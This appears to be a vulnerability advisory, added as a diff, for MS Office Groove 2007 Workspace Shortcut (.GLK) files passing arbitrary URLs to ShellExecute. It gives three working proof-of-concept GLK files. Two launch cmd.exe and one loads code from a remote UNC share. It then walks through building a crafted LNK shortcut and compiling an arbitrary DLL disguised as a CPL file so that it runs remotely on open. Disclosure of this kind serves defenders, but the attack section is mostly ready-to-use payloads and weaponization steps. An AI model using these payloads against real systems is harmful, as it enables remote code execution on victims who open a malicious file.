@@ -1,0 +1,83 @@
+Title: MS Office Groove 'Workspace Shortcut' Arbitrary Code Execution Vulnerability
+
+Date: September 28th, 2017.
+
+Author: Eduardo Braun Prado
+
+Vendor Homepage: http://www.microsoft.com/
+
+Software Link: https://products.office.com/
+
+Version: 2007  32-bits (x86)
+
+Tested on: Windows 7/Server 2008/Vista/Server 2003/XP (X86 and x64)
+
+CVE: N/A
+
+
+Description:
+
+MS Office Groove contains a security bypass issue regarding 'Workspace Shortcut' files (.GLK)
+because it allows arbitrary (registered) URL Protocols to be passed, when only 'grooveTelespace://' URLs
+should be allowed, which allows execution of arbitrary code upon opening a 'GLK' file. 
+Usually, URLs are passed to web browsers, but because it uses 'ShellExecute()', if malicious users pass
+a 'file:///' URL, it will launch the default application for the file type specified in the URL. Important:
+the 'GLK' extension is not in any of the Microsoft black list (eg. Outlook, IE) so we assume it´s a 'safe' file type. 2 proof of
+concepts are provided, one for simply launching 'cmd.exe', and another, remote, that works on any Windows version:
+
+-----poc_cmd_x64.GLK--------------------------------------------------------------------------------
+
+<?xml version='1.0'?><?groove.net version='1.0'?><ns1:ExplorerLink xmlns:ns1="urn:groove.net">
+    <ns1:NavigationInfo URL="file:///C:\windows\syswow64\cmd.exe"/>
+</ns1:ExplorerLink>
+
+----------------------------------------------------------------------------------------------------
+
+-----poc_cmd_x86.GLK--------------------------------------------------------------------------------
+
+<?xml version='1.0'?><?groove.net version='1.0'?><ns1:ExplorerLink xmlns:ns1="urn:groove.net">
+    <ns1:NavigationInfo URL="file:///C:\windows\system32\cmd.exe"/>
+</ns1:ExplorerLink>
+
+----------------------------------------------------------------------------------------------------
+
+-----poc_CPL.GLK------------------------------------------------------------------------------------
+
+<?xml version='1.0'?><?groove.net version='1.0'?><ns1:ExplorerLink xmlns:ns1="urn:groove.net">
+    <ns1:NavigationInfo URL="file:///\\192.168.0.50\share\CPL_Shortcut.lnk"/>
+</ns1:ExplorerLink>
+
+----------------------------------------------------------------------------------------------------
+
+* the 'CPL_Shortcut.lnk' is a special type of shortcut, which doesn´t trigger warnings upon opening,
+that can be easily created by dragging a
+Windows Control Panel item icon from the Control Panel folder to the Desktop. Notice the item must be
+a CPL file, not a special folder (some control panel items are just special types of folder not the 
+classic CPL file. 
+
+The easiest way to do it is:
+
+a) Grab a Windows XP machine (there are lots of Control Panel items that are CPL files)
+
+b) Drag and drop an icon, eg. the 'User Accounts' icon to the Desktop.
+
+c) Open the shortcut file created in the Desktop with an Hex Editor (you may need to rename the file,
+removing the '.lnk' extension or some programs will load the target of the shortcut instead of the shortcut
+file itself). Edit the portion (in 'Unicode' format) that points to :
+c:\windows\system32\nusrmgr.cpl and write an UNC path pointing to a valid CPL file:
+\\192.168.0.50\share\cpl_sh.cpl  (don´t forget the maximum path length (32 chars) must NOT be exceeded.)
+
+d) Save the file and rename it to "CPL_Shortcut.lnk" and finally place it in the appropriate folder,
+which will be accessed from remote, via: \\192.168.0.50\share
+
+e) Using MS Visual Studio (tested with a C++ DLL compiled with VS 2008),
+compile a DLL with code of choice and a 'DllMain' function and name it "cpl_sh.cpl".
+
+f) Make sure the share and the 2 files (the .CPL and .LNK) are anonymously accessible from a remote 
+machine.
+
+That´s it, now just open the 'GLK' files. Both 'cmd.exe' and the CPL file should be executed/loaded.
+Notice the files located in the remote share will take longer than 'CMD.exe' to be executed for obvious
+reasons, just wait a few seconds.
+
+
